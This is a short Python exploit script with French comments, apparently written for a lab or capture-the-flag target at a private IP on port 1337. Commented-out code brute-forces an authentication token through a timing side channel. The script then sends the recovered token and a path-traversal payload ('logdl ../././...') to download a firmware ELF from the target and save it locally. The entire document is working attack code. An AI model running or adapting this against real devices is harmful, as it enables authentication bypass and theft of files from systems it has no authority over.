import socket
import time

hote = "192.168.56.102"
port = 1337

socket_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_client.connect((hote, port))
print("Connexion à {hote} sur le port {port}".format(hote=hote, port=port))

def read(s, a):
    recv_full = b""
    recv_taille = 1000
    print("Envoie %s" % a)
    while len(recv_full) != recv_taille:
        recv = s.recv(4096)
        recv_full += recv
        if len(recv_full) >= 6 and recv_taille == 1000:
            recv_taille = recv_full[2:6]
            recv_taille = int.from_bytes(recv_taille, byteorder='big')
    # print(recv_full[6:].decode())
    print(recv_full[6:])

    if(recv_taille > 1000):
        fileout = "test.txt"
        with open(fileout, "wb") as fo:
            fo.write(recv_full[6:])

# %0338d348
# 01, %, *, @, ac
# for i in range (48, 103):
#     if i in range(58, 97): continue
#     a = b'%0338d34'
#     a += bytes([i])
#     print(a)
    # total = 0
    # for j in range(10):
    #     s = time.time()
    #     socket_client.send(a)
    #     read(socket_client)
    #     e = time.time()
    #     total += (e-s)
    # moyenne = total / 10
    # print("Moyenne is {time}".format(time=moyenne))

def authentification():
    a = b"%0338d348"
    socket_client.send(a)
    read(socket_client, a)

authentification()

# a = b"@\x14\x53\x7a\x40\x01"
a = b""
while a != b"end":
    print("Choose a command to send")
    a = b"\xac12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678"
    msg = input()
    a += msg.encode()
    print(a)
    if a == b"\x2asalut":
        a = b"\x2alogdl ../././././../././././././././././././././././././././././././././././././././././././././././././././././././FW/PART2.ELF"
    socket_client.send(a)
    read(socket_client, a)


socket_client.close()